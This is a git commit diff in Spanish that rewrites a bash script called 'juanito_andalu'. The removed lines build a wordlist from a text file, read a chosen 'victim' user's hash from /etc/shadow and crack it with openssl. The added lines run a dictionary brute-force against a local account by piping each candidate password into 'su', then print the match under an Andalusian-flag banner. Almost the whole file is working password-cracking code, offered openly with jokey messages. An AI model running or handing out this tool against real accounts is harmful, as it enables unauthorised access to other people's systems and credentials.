4ffc9f829849ae9e9d5256d6ff64f47d780a2e6e
Rafael Jiménez <116224815+r4f4soft@users.noreply.github.com>
2023-11-30 00:02:36 +0100

    Actualización de juanito_andalu

--- juanito_andalu.sh
+++ juanito_andalu.sh
@@ -1,10 +1,6 @@
 #!/bin/bash
 
-#**********************************************************#
-#*********************JUANITO_ANDALU***********************#
-#**********************************************************#
-
-# Colores que he usado para que se vea más bonito
+# Colores
 endColour="\033[0m\e[0m"
 redColour="\e[0;31m\033[1m"
 yellowColour="\e[0;33m\033[1m"
@@ -12,153 +8,67 @@ greenColour="\e[0;32m\033[1m"
 blueColour="\e[0;34m\033[1m"
 whiteColour="\e[1;37m\033[1m"
 
-# Autor: Rafa Er Loco
+###### FUNCIONAMIENTO DEL PROGRAMA ######
 
+# Recibe un usuario y un diccionario, mediante un comando realiza fuerza bruta hasta que dará con la contraseña
+# (En el caso de que se encuentre en el diccionario especificado)
 
-######## FUNCIONAMIENTO DEL PROGRAMA ############
+# Cuando el usuario pulse ctrl+c el programa finaliza
+ctrl_c(){
+    echo -e "\n${redColour}Finalizando script...${endColour}"
+    tput cnorm ; exit 1
+}
 
+# Llamamos a la función con trap SIGINT
+trap ctrl_c SIGINT
 
-# Recibe un fichero con texto plano, te elimina las palabras repetidas te borra las , y los . y te genera un diccionario para fuerza bruta
-# Y te filtra por longitud de palabras
+# Función para mostrar ayuda del script 
+mostrar_ayuda() {
+    echo -e "${yellowColour}Uso: $0 USUARIO DICCIONARIO"
+    echo -e "Se deben especificar tanto el nombre de usuario como el archivo de diccionario${endColour}"
+    exit 1
+}
 
-# $1 debe ser un fichero con texto plano
+# Función para imprimir banner
+mostrar_banner(){
+    echo -e ${greenColour}'       __                  _ __      '${whiteColour}'  ___              __      __     '${endColour}
+    echo -e ${greenColour}'      / /_  ______ _____  (_) /_____ '${whiteColour}' /   |  ____  ____/ /___ _/ /_  __'${endColour}
+    echo -e ${greenColour}' __  / / / / / __ `/ __ \/ / __/ __ \\'${whiteColour}'/ /| | / __ \/ __  / __ `/ / / / /'${endColour}
+    echo -e ${greenColour}'/ /_/ / /_/ / /_/ / / / / / /_/ /_/ /'${whiteColour}' ___ |/ / / / /_/ / /_/ / / /_/ / '${endColour}
+    echo -e ${greenColour}'\____/\__,_/\__,_/_/ /_/_/\__/\____/'${whiteColour}'_/  |_/_/ /_/\__,_/\__,_/_/\__,_/  \n'${endColour}
+}
 
+usuario=$1
+diccionario=$2
 
-
-# Comprobamos si el UID es del usuario root
-
-if [ $UID -ne 0 ];then
-	echo -e "${redColour}Debes ejecutar el script como root${endColour}"
-	exit 1
+if [ $# != 2 ]; then
+    mostrar_ayuda
 fi
 
-# Comprobamos si el número de parámetros es correcto
-
-if [ $# -ne 1 ]; then
-	echo -e "${redColour}Debe colocar un sólo parámetro y debe ser un fichero${endColour}"
-	exit 2
+if ! id $usuario &>/dev/null; then
+    echo -e "${redColour}[!] El usuario $usuario no existe${endColour}"
+    exit 1
+else
+    if [ ! -f $diccionario ]; then
+        echo -e "${redColour}[!] El diccionario no es correcto o no existe${endColour}"
+        exit 1
+    fi
 fi
 
-# Comprobamos el primer parámetro existe
+clear; mostrar_banner
 
-if [ ! -e $1 ]; then
-	echo -e "${redColour}$1 no existe${endColour}"
-	exit 3
-fi
-
-
-# Comprobamos si el parámetro es un fichero
-
-if [ ! -f $1 ];then
-	echo -e "${redColour}El parámetro no es un fichero${endColour}"
-	exit 4
-fi
-
-
-# Comprobamos que tiene los paquetes necesarios para que funcione todo correctamente (para usar el comando unique hay que tener instalado el paquete john)
-
-john &>/dev/null
-
-if [ $? -ne 0 ];then
-	echo -en "${redColour}Al parecer no tienes el paquete john instalado y es necesario (utilize sudo apt-get install john -y) o escriba la letra "y": ${endColour}"
-	read y
-fi
-
-
-# Y si el usuario escribe la letra y se le instala el paquete john
-
-if [[ $y == "y" ]];then
-	clear
-	sudo apt install john -y &>/dev/null && echo -e "${greenColour}Paquete john instalado correctamente${endColour}"
-	echo "Espere mientra arranca el programa..."
-	sleep 4
-fi
-
-
-# Bucle for para crear nuestro diccionario
-
-for lineas in `cat $1`; do
-	if [ ${#lineas} -ge 1 ];then
-	echo $lineas >> diccionario_palabras.txt
+tput civis
+while IFS= read -r password; do
+    echo -e "${whiteColour}Probando contraseña:${endColour} ${blueColour}$password${endColour}"
+	if timeout 0.1 bash -c "echo $password | su $usuario -c 'echo Hello'" &> /dev/null ; then
+	    clear
+	    echo -e "${greenColour}Contraseña encontrada para el usuario $usuario:${endColour} ${yellowColour}$password${endColour}"
+	    encontrado=1
+	    break
 	fi
-done
+done < "$diccionario"; tput cnorm
 
-# Eliminar las palabras repetidas
-
-if [ -e diccionario_filtrado.txt ];then
-	rm diccionario_filtrado.txt
-fi
-
-sort diccionario_palabras.txt | unique diccionario_filtrado.txt &>/dev/null
-
-# Borramos todos los puntos y las comas que haya en el texto
-
-cat diccionario_filtrado.txt | sed 's/,//g' | tr -d . > diccionario.txt
-
-# Borramos el fichero diccionario_palabras.txt y diccionario_filtrado.txt
-
-rm diccionario_palabras.txt && rm diccionario_filtrado.txt
-
-
-# Parte de John The Ripper Ezpañó (By Guillermo)
-
-clear
-read -p "Escribe el nombre de tu víctima (tiene que ser un nombre de usuario): " victima
-
-id $victima &>/dev/null
-
-# Comprobamos si el usuario existe
-
-if [ $? -ne 0 ]; then
-	echo -e "${redColour}El usuario $victima no existe${endColour}"
-	exit 5
-fi
-
-read -p "Está todo listo, ¿Quieres que empieze el ataque de fuerza bruta? si/no: " sino
-
-# Abrimos un case y depende lo que escribamos salta a un caso u otro
-
-case $sino in
-
-	[Ss]i)
-		clear
-		echo "Empezando ataque..."
-		sleep 2
-		# Buscamos la línea del fichero shadow
-		linea=`grep -w ^$victima /etc/shadow`
-
-		# Buscamos el trozo de contrasela completo
-		objetivo=`echo $linea | cut -d: -f2`
-		# Sacamos el algoritmo y la sal de la línea
-		alg=`echo $linea | cut -d: -f2 | cut -d\$ -f2`
-		sal=`echo $linea | cut -d: -f2 | cut -d\$ -f3`
-
-		# Empieza el bucle for
-		encontrado=0
-		for palabra in `cat diccionario.txt` ; do
-			posible=`openssl passwd -$alg -salt $sal $palabra`
-			if [[ $posible == $objetivo ]];then
-			   echo "¡¡Contraseña encontrada!! :D "
-			   echo -e "La contraseña del usuario $victima es:${yellowColour} $palabra${endColour}"
-			   encontrado=1
-			   break
-			fi
-		done
-	;;
-
-	[Nn]o)
-		echo -e "${blueColour}Po ya no kieres atake, adio :(${endColour}"
-		exit 0
-	;;
-
-	*)
-
-		echo -e "${redColour}ERROR! Tienes que escribir si o no${endColour}"
-		exit 0
-	;;
-
-esac
-
+# Si se encuentra la contraseña se muestra la bandera de andalucia
 if [[ $encontrado -eq 1 ]];then
 	echo -e "\n${greenColour}######################${endColour}"
 	echo -e "${greenColour}######################${endColour}"
@@ -167,22 +77,8 @@ if [[ $encontrado -eq 1 ]];then
 	echo -e "${greenColour}######################${endColour}"
 	echo -e "${greenColour}######################${endColour}\n"
 
-	echo "¡¡¡VIVA ANDALUZIA COHONE!!!"
+	echo -e "${greenColour}¡¡¡VIVA ANDALUZIA COHONE!!!${endColour}"
+
 else
-	echo "No se ha dao con la contraseña :("
+	echo -e "\n${blueColour}No se ha dao con la contraseña :(${endColour}"
 fi
-
-
-echo -en "${yellowColour}¿Quieres borrar el diccionario creado? si/no:${endColour} "
-read sinodic
-
-if [ $sinodic == "si" ]; then
-	echo "Borrando diccionario.txt..."
-	sleep 2
-	rm diccionario.txt
-else
-	echo "El fichero del diccionario se llama diccionario.txt"
-fi
-
-### FELIZ NAVIDAD ####
-
